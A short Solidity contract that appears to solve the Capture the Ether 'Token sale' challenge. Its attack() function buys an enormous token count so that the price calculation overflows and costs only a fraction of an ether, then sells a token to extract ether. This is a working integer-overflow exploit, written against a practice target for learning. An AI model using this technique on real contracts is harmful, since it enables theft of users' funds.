pragma solidity ^0.4.21;

import "../../../Exercise/CaptureTheEther/9/TokenSale.sol";

contract AttackTokenSales {
    TokenSaleChallenge sales;

    constructor(TokenSaleChallenge importAddress) {
        sales = importAddress;
    }

    function attack() payable{
    sales.buy.value(415992086870360064 wei)(uint256(115792089237316195423570985008687907853269984665640564039458));
    sales.sell(1);
//    sales.buy(uint256(115792089237316195423570985008687907853269984665640564039458));
    }
}
